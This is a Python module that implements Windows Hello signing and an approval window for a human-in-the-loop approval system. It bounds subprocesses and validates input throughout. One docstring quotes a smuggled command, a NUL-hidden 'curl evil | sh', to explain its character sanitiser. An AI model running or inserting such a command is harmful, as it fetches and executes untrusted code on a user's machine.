"""Strong approval through Windows Hello, from Windows or from WSL.

An approval collab can trust is a SIGNATURE BY A KEY THAT SIGNS ONLY AFTER A
HUMAN GESTURE — a fingerprint, a face, a PIN — collected by Windows itself. An
agent on this machine can ask for a signature; it cannot complete one. This
module is the Windows half of that: it enrols a TPM-backed key with
`KeyCredentialManager`, signs a challenge with it, and shows collab's own
approval window, the front door a human starts each approval from. The proof is
the gesture: THE HUB verifies every signature against the key enrolled for
this participant before anything acts on it (the hub's verifier is
R22b-core's); `verify` here is the same check, for a local self-test only.

VERIFIED BY EXECUTION, with the user making the gestures (2026-11-14,
.claude/r22b-strong-approval-design.md):

* `RequestCreateAsync` prompts; `RequestSignAsync` prompts on EVERY call — about
  12 s each with a human; `RetrievePublicKey` reads the SPKI without a prompt.
* Signatures are RSA-2048, PKCS#1 v1.5 over SHA-256 of the bytes given — the
  test vector in tests/test_consent_hello.py is the one the user signed.
* `DeleteAsync` needs NO gesture (63 ms). An agent can delete the human's key:
  a denial of service, not a forgery, and the hub treats a key that has gone
  as an alarm, never as a reason to fall back quietly.
* The Hello dialog shows no text of the caller's, which is why collab's own
  window shows the review — and it is not the secure desktop (the screen does
  not dim), so a PIN typed there may be observable by a same-user process.
  A captured PIN still needs this machine's TPM key and a gesture per
  signature; biometrics are preferred, and the docs say so.
* PowerShell 5.1 cannot cast a WinRT `IBuffer`; the scripts use
  `WindowsRuntimeBufferExtensions.ToArray` / `AsBuffer` through reflection.

NOTHING THE CALLER SUPPLIES IS EVER POWERSHELL CODE. The script is a fixed
string, passed with `-EncodedCommand`; the key name, the challenge and the
review travel as one base64 line on stdin — which also sidesteps PowerShell
5.1's console encoding — and the name is checked against `_NAME` first.

EVERY CALL IS A BOUNDED SUBPROCESS, the project's three limits for reading a
peer it does not control: an output cap (`OUTPUT_CAP`), a deadline enforced
while nothing arrives (the reader is a thread; the clock is ours), and its own
process group, ended as a group at the deadline. A human who cancels the Hello
prompt is a `Refused`, never a hang.
"""

from __future__ import annotations

import base64
import json
import os
import re
import shutil
import signal
import subprocess
import threading
import time
from typing import Any, Callable

#: Where Windows keeps PowerShell 5.1 when WSL's PATH does not carry it.
_WINDOWS_POWERSHELL = "/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"

#: A Hello key name: what `KeyCredentialManager` files the key under. Checked
#: here although it never reaches PowerShell as code, because it is also the
#: `credential_id` the hub records.
_NAME = re.compile(r"[A-Za-z0-9._-]{1,64}\Z")

#: The most a call may print. A public key is ~400 bytes of base64 and a
#: signature ~350; a review is never printed back. 64 KiB is a hundred times
#: what a correct answer needs and bounds what a broken one can cost.
OUTPUT_CAP = 64 * 1024

#: Seconds a call that needs no human may take — PowerShell and WinRT start in
#: about 1–2 s on this machine — and one that waits for a human's gesture.
QUICK = 15.0
HUMAN = 120.0

#: How long the approval window may stay open. Reading a long review is
#: slower than making a gesture, and a window that closed itself mid-read
#: would teach a human to approve quickly. Ten minutes; then the request
#: EXPIRES — never «declined», which would be a decision nobody made.
WINDOW_DEADLINE = 600.0

#: The largest review the window is handed. The canonical review is built by
#: the hub; this is the bound on what reaches the dialog however it was built.
REVIEW_MAX = 64 * 1024


class HelloError(Exception):
    """Windows Hello answered with a status collab cannot act on."""

    def __init__(self, status: str) -> None:
        super().__init__(f"Windows Hello: {status}")
        self.status = status


class Refused(HelloError):
    """The human cancelled the prompt, or chose a password. A refusal."""


class NotEnrolled(HelloError):
    """There is no Hello key of that name on this machine."""


class AlreadyEnrolled(HelloError):
    """A Hello key of that name exists already; enrolment does not replace one."""


class Unavailable(HelloError):
    """No Windows Hello here: no powershell.exe, or the security device locked.
    (A machine with no usable TPM most likely answers UnknownError, which is
    a plain HelloError — unverified.)"""


#: KeyCredentialStatus → the outcome it means. Anything else is a HelloError
#: carrying the status — the word, never more than the word.
_OUTCOMES = {
    "UserCanceled": Refused,
    "UserPrefersPassword": Refused,
    "NotFound": NotEnrolled,
    "CredentialAlreadyExists": AlreadyEnrolled,
    "SecurityDeviceLocked": Unavailable,
}


_SCRIPT = r"""
$ErrorActionPreference = 'Stop'
function Say($o) { [Console]::Out.WriteLine(($o | ConvertTo-Json -Compress)) }
try {
  $line = [Console]::In.ReadLine()
  $req = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($line)) | ConvertFrom-Json
  if ($req.op -eq 'window') {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $f = New-Object Windows.Forms.Form
    $f.Text = 'collab - approval requested'
    $f.TopMost = $true
    $f.StartPosition = 'CenterScreen'
    $f.Size = New-Object Drawing.Size(760, 600)
    $f.MinimizeBox = $false
    $id = New-Object Windows.Forms.Label
    $id.Text = $req.requester
    $id.AutoEllipsis = $true
    $id.Font = New-Object Drawing.Font('Segoe UI', 11, [Drawing.FontStyle]::Bold)
    $id.SetBounds(12, 8, 720, 24)
    $name = New-Object Windows.Forms.Label
    $name.Text = $req.name
    $name.AutoEllipsis = $true
    $name.SetBounds(12, 34, 720, 20)
    $what = New-Object Windows.Forms.Label
    $what.Text = $req.summary
    $what.AutoEllipsis = $true
    $what.SetBounds(12, 58, 720, 20)
    $box = New-Object Windows.Forms.TextBox
    $box.Multiline = $true
    $box.ReadOnly = $true
    $box.ScrollBars = 'Vertical'
    $box.WordWrap = $true
    $box.Font = New-Object Drawing.Font('Consolas', 10)
    $box.Text = $req.review
    $box.SetBounds(12, 84, 720, 410)
    $box.MaxLength = 0
    $script:choice = 'decline'
    $ok = New-Object Windows.Forms.Button
    $ok.Text = 'Approve with Windows Hello'
    $ok.SetBounds(12, 505, 230, 36)
    $ok.Add_Click({ $script:choice = 'approve'; $f.Close() })
    $no = New-Object Windows.Forms.Button
    $no.Text = 'Decline'
    $no.SetBounds(252, 505, 140, 36)
    $no.Add_Click({ $script:choice = 'decline'; $f.Close() })
    $pk = New-Object Windows.Forms.Button
    $pk.Text = 'Use a passkey instead'
    $pk.SetBounds(522, 505, 210, 36)
    $pk.Add_Click({ $script:choice = 'passkey'; $f.Close() })
    $f.Controls.AddRange(@($id, $name, $what, $box, $ok, $no, $pk))
    $f.CancelButton = $no
    $f.AcceptButton = $no
    $f.Add_Shown({ $f.Activate(); $no.Focus() })
    if ($req.dry) {
      $keys = @{status = 'Success'; choice = 'built';
                accept = [bool]($f.AcceptButton -eq $no); cancel = [bool]($f.CancelButton -eq $no)}
      $f.Dispose(); Say $keys; exit 0
    }
    [void]$f.ShowDialog()
    Say @{status = 'Success'; choice = $script:choice}
    exit 0
  }
  Add-Type -AssemblyName System.Runtime.WindowsRuntime
  [void][Windows.Security.Credentials.KeyCredentialManager,Windows.Security.Credentials,ContentType=WindowsRuntime]
  [void][Windows.Storage.Streams.IBuffer,Windows.Storage.Streams,ContentType=WindowsRuntime]
  $asTask = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' } | Select-Object -First 1
  function Await($op, [Type]$t) {
    $task = $asTask.MakeGenericMethod($t).Invoke($null, @($op))
    $task.Wait(-1) | Out-Null
    $task.Result
  }
  $ext = [System.Runtime.InteropServices.WindowsRuntime.WindowsRuntimeBufferExtensions]
  $toArray = $ext.GetMethod('ToArray', [Type[]]@([Windows.Storage.Streams.IBuffer]))
  $asBuffer = $ext.GetMethod('AsBuffer', [Type[]]@([byte[]]))
  $KCM = [Windows.Security.Credentials.KeyCredentialManager]
  $Retrieval = [Windows.Security.Credentials.KeyCredentialRetrievalResult]
  $Spki = [Windows.Security.Cryptography.Core.CryptographicPublicKeyBlobType]::X509SubjectPublicKeyInfo
  function PublicKey($cred) {
    [Convert]::ToBase64String($toArray.Invoke($null, @($cred.RetrievePublicKey($Spki))))
  }
  switch ($req.op) {
    'supported' {
      Say @{status = 'Success'; supported = [bool](Await ($KCM::IsSupportedAsync()) ([bool]))}
    }
    'create' {
      $r = Await ($KCM::RequestCreateAsync($req.name,
            [Windows.Security.Credentials.KeyCredentialCreationOption]::FailIfExists)) $Retrieval
      if ($r.Status -ne 'Success') { Say @{status = "$($r.Status)"} }
      else { Say @{status = 'Success'; spki = (PublicKey $r.Credential)} }
    }
    'pubkey' {
      $r = Await ($KCM::OpenAsync($req.name)) $Retrieval
      if ($r.Status -ne 'Success') { Say @{status = "$($r.Status)"} }
      else { Say @{status = 'Success'; spki = (PublicKey $r.Credential)} }
    }
    'sign' {
      $r = Await ($KCM::OpenAsync($req.name)) $Retrieval
      if ($r.Status -ne 'Success') { Say @{status = "$($r.Status)"} }
      else {
        $msg = [Convert]::FromBase64String($req.challenge)
        $s = Await ($r.Credential.RequestSignAsync($asBuffer.Invoke($null, @(,$msg)))) `
              ([Windows.Security.Credentials.KeyCredentialOperationResult])
        if ($s.Status -ne 'Success') { Say @{status = "$($s.Status)"} }
        else { Say @{status = 'Success'; signature = [Convert]::ToBase64String($toArray.Invoke($null, @($s.Result)))} }
      }
    }
    default { Say @{status = 'BadRequest'} }
  }
} catch {
  # The exception's TYPE only: its message can carry text nobody vetted.
  Say @{status = 'Error'; error = $_.Exception.GetType().Name}
}
"""


def _powershell() -> str | None:
    """Windows PowerShell 5.1: on PATH on Windows, at a fixed place under WSL."""
    found = shutil.which("powershell.exe")
    if found:
        return found
    return _WINDOWS_POWERSHELL if os.path.exists(_WINDOWS_POWERSHELL) else None


def _command(exe: str) -> list[str]:
    encoded = base64.b64encode(_SCRIPT.encode("utf-16-le")).decode("ascii")
    return [exe, "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", encoded]


def _run(request: dict, deadline: float) -> dict:
    """One call to the script: a JSON request in, one JSON answer out.

    Bounded three ways (see the module docstring). Raises `Unavailable` when
    there is no PowerShell, `HelloError("Timeout")` at the deadline — the
    process group is ended first — and `HelloError("BadAnswer")` for anything
    that is not one JSON object.
    """
    # THE CLOCK STARTS HERE, before the process exists and before anything is
    # written to it. Started after a blocking stdin write, a child that never
    # read its stdin held the caller for as long as the pipe stayed full —
    # measured at 30 s against a 2 s deadline.
    end = time.monotonic() + deadline
    exe = _powershell()
    if exe is None:
        raise Unavailable("NoPowerShell")
    line = base64.b64encode(json.dumps(request).encode("utf-8")) + b"\n"
    group = ({"start_new_session": True} if os.name == "posix"
             else {"creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)})
    try:
        proc = subprocess.Popen(_command(exe), stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, **group)
    except OSError as exc:
        raise Unavailable(type(exc).__name__) from None
    got = bytearray()
    over = threading.Event()

    def read() -> None:
        assert proc.stdout is not None
        while True:
            chunk = proc.stdout.read1(4096) if hasattr(proc.stdout, "read1") \
                else proc.stdout.read(4096)
            if not chunk:
                return
            if len(got) + len(chunk) > OUTPUT_CAP:
                over.set()
                return
            got.extend(chunk)

    def write() -> None:
        try:
            assert proc.stdin is not None
            proc.stdin.write(line)
            proc.stdin.close()
        except (OSError, ValueError):
            pass

    reader = threading.Thread(target=read, daemon=True, name="collab-hello-read")
    writer = threading.Thread(target=write, daemon=True, name="collab-hello-write")
    reader.start()
    writer.start()
    try:
        while reader.is_alive() and not over.is_set() and time.monotonic() < end:
            reader.join(0.05)
        if reader.is_alive() or over.is_set():
            _end_group(proc)
            reader.join(1.0)
            raise HelloError("OutputTooLarge" if over.is_set() else "Timeout")
        try:
            proc.wait(max(0.1, end - time.monotonic()))
        except subprocess.TimeoutExpired:
            _end_group(proc)
        return _answer(bytes(got))
    finally:
        # NOT WHILE THE READER IS IN IT. Closing a buffered pipe another thread
        # is blocked reading waits for that read to return — and a grandchild
        # still holding the pipe (when only `proc.kill()` could be used, not a
        # group kill) kept it open for its whole life: a 1.5 s deadline took
        # 60 s. A reader still running is a daemon thread on a pipe that will
        # reach end of file when its last holder exits. The same for the
        # writer, blocked on a stdin nobody reads.
        pipes = (([] if writer.is_alive() else [proc.stdin])
                 + ([] if reader.is_alive() else [proc.stdout]))
        for pipe in pipes:
            try:
                if pipe is not None:
                    pipe.close()
            except (OSError, ValueError):
                pass


def _end_group(proc: subprocess.Popen) -> None:
    """End the call's own process tree — powershell.exe and anything it
    started — then reap. Only this process's own tree, never a name match.

    POSIX (WSL): the process group the call was started in. Native Windows
    has no process groups to signal and no `os.killpg`: `taskkill /T /F` on
    the call's own pid ends its tree. Anything that fails here is caught —
    an exception on the kill path would leave the process running AND lose
    the timeout it was ending."""
    try:
        if os.name == "posix":
            os.killpg(proc.pid, signal.SIGKILL)
        else:
            subprocess.run(["taskkill", "/T", "/F", "/PID", str(proc.pid)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                           timeout=5, check=False)
    except Exception:                                         # noqa: BLE001
        try:
            proc.kill()
        except Exception:                                     # noqa: BLE001
            pass
    try:
        proc.wait(2)
    except Exception:                                         # noqa: BLE001
        pass


def _answer(raw: bytes) -> dict:
    """The one JSON object the script printed, from PowerShell's output.

    The LAST line that parses: PowerShell can put a BOM or a banner ahead of
    it, and CRLF after it."""
    text = raw.decode("utf-8", "replace").lstrip("﻿")
    for candidate in reversed([ln.strip() for ln in text.splitlines() if ln.strip()]):
        try:
            value = json.loads(candidate)
        except ValueError:
            continue
        if isinstance(value, dict) and isinstance(value.get("status"), str):
            return value
    raise HelloError("BadAnswer")


def _checked(answer: dict) -> dict:
    status = answer["status"]
    if status == "Success":
        return answer
    raise _OUTCOMES.get(status, HelloError)(status[:40])


def _name(name: str) -> str:
    if not isinstance(name, str) or not _NAME.match(name):
        raise ValueError("a Hello key name is 1–64 of A–Z a–z 0–9 . _ -")
    return name


def _ps_b64(value: Any, what: str) -> bytes:
    """A binary field from OUR OWN PowerShell child — standard, padded base64,
    since that is what .NET's `Convert.ToBase64String` writes. It never
    reaches the hub: everything crossing the adapter's boundary is converted
    to base64url by `b64url` first."""
    if not isinstance(value, str):
        raise HelloError(f"BadAnswer:{what}")
    try:
        return base64.b64decode(value, validate=True)
    except ValueError:
        raise HelloError(f"BadAnswer:{what}") from None


#: Canonical UNPADDED base64url, the hub's encoding for every binary field
#: (strong-approval API v1, #161): A–Z a–z 0–9 `-` `_`, nothing else.
_B64URL = re.compile(r"[A-Za-z0-9_-]+", re.ASCII)


def b64url(raw: bytes) -> str:
    """Bytes as the hub's wire wants them: base64url, no `=` padding."""
    return base64.urlsafe_b64encode(bytes(raw)).rstrip(b"=").decode("ascii")


def unb64url(value: Any, *, limit: int) -> bytes:
    """A binary field from the hub's side, decoded only if it is CANONICAL
    unpadded base64url of 1–`limit` bytes; ValueError otherwise.

    STRICT BOTH WAYS, as the hub is. This boundary used `b64decode`, which
    takes the standard alphabet and padding: a dispatcher that handed over
    `+`/`/` or `=` got a signature here that the hub — reading the same field
    canonically — would refuse, or a challenge that was never the hub's. So
    `=`, `+`, `/`, whitespace and non-zero pad bits (two spellings of one
    value) are all refused, and the length is bounded before decoding."""
    if (not isinstance(value, str) or len(value) > (limit * 4 + 2) // 3
            or _B64URL.fullmatch(value) is None):
        raise ValueError("not canonical unpadded base64url")
    try:
        raw = base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))
    except ValueError:
        raise ValueError("not canonical unpadded base64url") from None
    if not raw or len(raw) > limit or b64url(raw) != value:
        raise ValueError("not canonical unpadded base64url")
    return raw


# --- the four operations ------------------------------------------------------------

def available() -> bool:
    """Is Windows Hello usable here? Never prompts; never raises."""
    try:
        return _checked(_run({"op": "supported"}, QUICK)).get("supported") is True
    except Exception:                                         # noqa: BLE001
        return False


#: Every challenge the hub issues is SHA-256 of its canonical envelope: 32
#: bytes, no more and no fewer (`approval_crypto._challenge`, #161 at c9a1a09).
CHALLENGE_BYTES = 32

#: The least time left on a challenge for the Hello prompt to be worth raising:
#: below it the human would be asked for a gesture the hub then refuses (410).
SIGN_FLOOR = 5.0


def enrol(name: str, challenge: str) -> dict:
    """First-key enrolment: create a gesture-bound key named `name` and PROVE
    POSSESSION of it by signing the hub's enrolment `challenge` (from
    `/enrol/begin`) — two Hello gestures. Returns exactly the body
    `/enrol/finish` takes, `challenge_id` aside: {credential_id, algorithm,
    public_key_spki, proof}. NOT `method`: that route rejects unknown fields,
    and the method was fixed at `/enrol/begin`.

    WHY THE SECOND GESTURE (decision e_867b714f…): `create` and the public key
    alone prove nothing about who holds the private half of the key sent; a
    signature over the hub's fresh challenge does. Raises `AlreadyEnrolled`
    rather than replacing a key and `Refused` on a cancel of either gesture.
    A key whose proof was cancelled stays in Hello under its name; `prove`
    completes a fresh `/enrol/begin` with it, without creating another.
    """
    raw = _challenge32(challenge)
    spki = _create(name)
    return _proven(name, spki, raw)


def new_key(name: str) -> dict:
    """A new key for the signed key-change protocol (`/key-changes/begin`,
    kinds add, rotate, recover): one gesture, and exactly that route's key
    fields — {credential_id, method, algorithm, public_key_spki}; the caller
    adds `kind` and `replaced_credential_id`. Possession is proved afterwards,
    over the challenge `begin` returns, with `prove(name, challenge)["proof"]`
    for `/key-changes/{id}/prove`. Split from `enrol` because that challenge
    exists only once the hub has the key."""
    spki = _create(name)
    return {"credential_id": name, "method": "hello", "algorithm": -257,
            "public_key_spki": b64url(spki)}


def prove(name: str, challenge: str) -> dict:
    """Possession of the key that ALREADY exists under `name`, over a hub
    challenge (an enrolment's, or a key change's `key-possession` one) — one
    gesture. Returns `enrol`'s body; a key change forwards only its `proof`."""
    raw = _challenge32(challenge)
    return _proven(name, public_key(name), raw)


def _create(name: str) -> bytes:
    answer = _checked(_run({"op": "create", "name": _name(name)}, HUMAN))
    return _ps_b64(answer.get("spki"), "spki")


def _challenge32(challenge: Any) -> bytes:
    """A hub challenge, checked before any prompt: one that cannot be signed —
    or that the hub would refuse signed — must not cost the human a gesture."""
    raw = unb64url(challenge, limit=CHALLENGE_BYTES)
    if len(raw) != CHALLENGE_BYTES:
        raise ValueError("a hub challenge is 32 bytes")
    return raw


def _proven(name: str, spki: bytes, challenge: bytes) -> dict:
    signature = sign(name, challenge)
    # Checked against the key just created: an answer this Hello did not make
    # is never forwarded as a proof. The hub checks it again, and that is the
    # check that counts (see `open_window`).
    if not verify(spki, challenge, signature):
        raise HelloError("SignatureMismatch")
    return {"credential_id": name, "algorithm": -257,
            "public_key_spki": b64url(spki),
            "proof": {"type": "hello", "signature": b64url(signature)}}


def public_key(name: str) -> bytes:
    """The enrolled key's SubjectPublicKeyInfo, DER. Does not prompt."""
    answer = _checked(_run({"op": "pubkey", "name": _name(name)}, QUICK))
    return _ps_b64(answer.get("spki"), "spki")


def sign(name: str, challenge: bytes, *, deadline: float = HUMAN) -> bytes:
    """Sign `challenge` with the key `name` — the human is prompted, every
    time. RSA PKCS#1 v1.5 over SHA-256 of `challenge` (Hello hashes it; the hub
    verifies SHA256-with-RSA over the same bytes). `Refused` on a cancel;
    `deadline` bounds the wait for the gesture."""
    if not isinstance(challenge, (bytes, bytearray)) or not 1 <= len(challenge) <= 4096:
        raise ValueError("a challenge is 1–4096 bytes")
    answer = _checked(_run({"op": "sign", "name": _name(name),
                            "challenge": base64.b64encode(bytes(challenge)).decode("ascii")},
                           min(HUMAN, deadline)))
    return _ps_b64(answer.get("signature"), "signature")


def verify(spki_der: bytes, message: bytes, signature: bytes) -> bool:
    """Does `signature` sign `message` under this RSA key, PKCS#1 v1.5 /
    SHA-256 — as Hello signs? The hub's check, for a local self-test."""
    from cryptography.exceptions import InvalidSignature
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa

    try:
        key = serialization.load_der_public_key(spki_der)
    except ValueError:
        return False
    if not isinstance(key, rsa.RSAPublicKey):
        return False
    try:
        key.verify(signature, message, padding.PKCS1v15(), hashes.SHA256())
        return True
    except InvalidSignature:
        return False


# --- the approval window ------------------------------------------------------------

def _visible(text: Any, *, lines: bool) -> str:
    """Text a remote party chose, made to show what it IS.

    Every control and format character becomes a visible `\\u{XXXX}`: C0/C1
    controls, NUL among them — WinForms stops drawing a TextBox at a NUL, so
    «make test\\0; curl evil | sh» showed only «make test» — the bidi
    overrides and isolates (U+202A–202E, U+2066–2069) that reorder what is
    drawn, zero-width characters, the BOM, line and paragraph separators, and
    unpaired surrogates. `lines` keeps tab, CR and LF, for the review box.
    """
    import unicodedata

    out = []
    for c in "" if text is None else str(text):
        if lines and c in "\t\r\n":
            out.append(c)
        elif unicodedata.category(c) in ("Cc", "Cf", "Cs", "Co", "Cn", "Zl", "Zp"):
            out.append(f"\\u{{{ord(c):04X}}}")
        else:
            out.append(c)
    return "".join(out)


def _line(value: Any, limit: int) -> str:
    """One line of a remote party's text: visible, single-line, bounded."""
    text = _visible(value, lines=False)
    return (text[:limit] + "…") if len(text) > limit else (text or "?")


_DIGEST = re.compile(r"[0-9a-f]{64}", re.ASCII)


def _digest(value: Any) -> str:
    """The hub's review digest: LOWERCASE SHA-256 HEX, 64 characters (v1:
    «`digest` and key fingerprints are lowercase SHA-256 hex»)."""
    if not isinstance(value, str) or _DIGEST.fullmatch(value) is None:
        raise ValueError("a digest is 64 lowercase hex characters")
    return value


def fields(request: dict) -> dict:
    """What the window's three lines say.

    THE HUB-ASSIGNED ID FIRST, on its own line: a requester's NAME is its own
    choice, and one chosen to read «alice (p_alice) asks for approval ⸻…»
    pushed the real id off a wrapped label. The name comes second, marked as
    self-chosen; the third line is subject, destination, authority and the
    digest's first 16 hex.

    THE DIGEST ARRIVES AS THE HUB SENDS IT, 64 lowercase hex; its first 16
    are shown, for the eye only, and nothing of it is sent anywhere.
    """
    try:
        digest = _digest(request.get("digest"))[:16]
    except ValueError:
        digest = "invalid"
    return {
        "requester": f"Requester: {_line(request.get('requester_id'), 64)}"
                     "  — participant id, assigned by the hub",
        "name": f"Calls itself: {_line(request.get('requester_name'), 64)}  (self-chosen)",
        "summary": (f"{_line(request.get('subject'), 60)} → "
                    f"{_line(request.get('destination'), 60)}"
                    f" · grants {_line(request.get('authority'), 60)}"
                    f" · digest {digest}"),
    }


def open_window(request: dict, fetch_challenge: Callable[[], dict]) -> dict:
    """Show collab's approval window for `request`, and act on the choice.

    THE BOUNDARY, as the dispatcher that adopts a strong-approval request
    (#161) uses it:

    1. it reads `GET /requests/{id}/review` and calls this with `request`:
       request_id, requester_id, requester_name, subject, destination,
       authority, `digest` (64 lowercase hex, as the review returns it),
       review_text (the decoded `canonical_review`) and `credential_id`;
    2. the human decides in the window; only on Approve is `fetch_challenge`
       called — the dispatcher's `POST /requests/{id}/challenge` — and its
       answer is the hub's response object as returned;
    3. the challenge is checked (32 bytes, base64url, for this credential and
       the REVIEWED digest), signed with one Hello gesture inside its expiry,
       and checked locally against the key's public half;
    4. the dispatcher posts {challenge_id, credential_id, proof} from the
       result to `/approve` and passes the receipt to the adopting execution
       path; a decline is `POST /decline` with `{}`; anything else posts
       nothing and falls back to nothing weaker.

    WHY THE CHALLENGE COMES AFTER THE DECISION: a hub challenge expires 120 s
    after issuance, and a human reading a review may take longer — fetched
    before the window, an approval given at minute three was a 410.

    Returns one of:

        {"choice": "approve", "method": "hello", "challenge_id",
         "credential_id", "proof": {"type": "hello", "signature"}}
        {"choice": "decline"}            — and {"reason": "Refused"} for a
                                           cancelled gesture
        {"choice": "passkey"}            — the dispatcher opens the passkey page
        {"choice": "expired"}            — nobody chose within WINDOW_DEADLINE,
                                           or the challenge ran out
        {"choice": "unavailable", "reason"}

    The window shows the review as untrusted text; the Hello dialog that
    follows shows none. Nothing of the review is logged.
    """
    # VALIDATED BEFORE THE WINDOW: a request that could not be signed must not
    # ask a human to read and approve it first.
    cred = request.get("credential_id")
    request_id = request.get("request_id")
    try:
        _name(cred)
        digest = _digest(request.get("digest"))
        if not isinstance(request_id, str) or not request_id:
            raise ValueError("no request id")
    except (ValueError, TypeError):
        return {"choice": "unavailable", "reason": "BadRequest"}
    review = _visible(request.get("review_text"), lines=True)
    if len(review) > REVIEW_MAX:
        review = review[:REVIEW_MAX] + "\n… [the review is longer than the window shows]"
    review = ("UNTRUSTED — this is what the requester sent, shown as text:\n\n"
              + review.replace("\r\n", "\n").replace("\n", "\r\n"))
    try:
        answer = _run({"op": "window", **fields(request), "review": review},
                      WINDOW_DEADLINE)
        choice = _checked(answer).get("choice")
    except Unavailable as exc:
        return {"choice": "unavailable", "reason": exc.status}
    except HelloError as exc:
        if exc.status == "Timeout":
            return {"choice": "expired"}
        # The window could not be shown — WinForms failed, PowerShell broke:
        # nothing was decided, so nothing is declined.
        return {"choice": "unavailable", "reason": exc.status}
    if choice == "passkey":
        return {"choice": "passkey"}
    if choice != "approve":
        return {"choice": "decline"}
    try:
        issued = fetch_challenge()
    except Exception:                                         # noqa: BLE001
        # The hub refused or could not be reached: nothing was signed, and
        # nothing is approved or declined on the human's behalf.
        return {"choice": "unavailable", "reason": "ChallengeFailed"}
    try:
        challenge, challenge_id, expires_at = _issued(issued, cred, digest, request_id)
    except (ValueError, TypeError, KeyError, OverflowError):
        return {"choice": "unavailable", "reason": "BadChallenge"}
    left = expires_at - time.time()
    if left < SIGN_FLOOR:
        return {"choice": "expired"}
    try:
        signature = sign(cred, challenge, deadline=left)
    except Refused:
        return {"choice": "decline", "reason": "Refused"}
    except NotEnrolled:
        return {"choice": "unavailable", "reason": "NotEnrolled"}
    except HelloError as exc:
        if exc.status == "Timeout":
            return {"choice": "expired"}
        return {"choice": "unavailable", "reason": exc.status}
    # CHECKED HERE TOO, against the key's own public half — read without a
    # prompt. This catches a broken or corrupted answer before it is forwarded
    # as an approval. It does NOT catch a swapped powershell.exe: the public key
    # comes back through the same executable, so a forger controls both. The
    # hub's verification, against the key enrolled for this participant, is
    # the control that counts.
    try:
        if not verify(public_key(cred), challenge, signature):
            return {"choice": "unavailable", "reason": "SignatureMismatch"}
    except HelloError as exc:
        return {"choice": "unavailable", "reason": exc.status}
    return {"choice": "approve", "method": "hello", "challenge_id": challenge_id,
            "credential_id": cred,
            "proof": {"type": "hello", "signature": b64url(signature)}}


# The hub issues a challenge for 120 s; 30 s more absorbs clock skew between
# this machine and the hub. Anything further out is not a hub challenge, and
# an unbounded integer would overflow float() (arma's review of #151: 10**400
# raised OverflowError out of the adapter instead of refusing).
CHALLENGE_HORIZON = 120 + 30


def _issued(issued: Any, cred: str, digest: str, request_id: str) -> tuple[bytes, str, float]:
    """The hub's `/challenge` answer, checked against what the human reviewed:
    the SAME REQUEST, the same credential, the SAME DIGEST and an explicit
    Hello method — a challenge for any other request is never signed under this
    review, even one whose operation hashes the same (arma's review of #151:
    another request_id with this key and digest still signed, and so did an
    answer that left the method out)."""
    if not isinstance(issued, dict):
        raise ValueError("not a challenge")
    if (issued.get("request_id") != request_id or issued.get("credential_id") != cred
            or issued.get("digest") != digest):
        raise ValueError("a challenge for something else")
    if issued.get("method") != "hello":
        raise ValueError("not a Hello challenge")
    challenge_id = issued["challenge_id"]
    expires_at = issued["expires_at"]
    if not isinstance(challenge_id, str) or not challenge_id:
        raise ValueError("no challenge id")
    if type(expires_at) is not int:
        raise ValueError("expiry is an integer Unix second")
    if not 0 < expires_at - time.time() <= CHALLENGE_HORIZON:
        raise ValueError("expiry is not a hub challenge's")
    return _challenge32(issued["challenge"]), challenge_id, float(expires_at)


def build_window_only(request: dict) -> dict:
    """Build the window with this request's text and dispose of it unshown —
    a real check of the WinForms code that raises nothing on the screen."""
    return _checked(_run({"op": "window", "dry": True, **fields(request),
                          "review": _visible(request.get("review_text"), lines=True)},
                         QUICK))


__all__ = ["AlreadyEnrolled", "HelloError", "NotEnrolled", "Refused", "Unavailable",
           "available", "b64url", "build_window_only", "enrol", "fields",
           "new_key", "open_window", "prove", "public_key", "sign", "unb64url",
           "verify"]


def _self_check(name: str = "collab-selftest") -> None:      # pragma: no cover
    """By hand only: enrol (prompts twice), sign (prompts), verify."""
    record = enrol(name, b64url(os.urandom(32)))
    spki = unb64url(record["public_key_spki"], limit=4096)
    message = b"collab hello self-check"
    print(verify(spki, message, sign(name, message)))

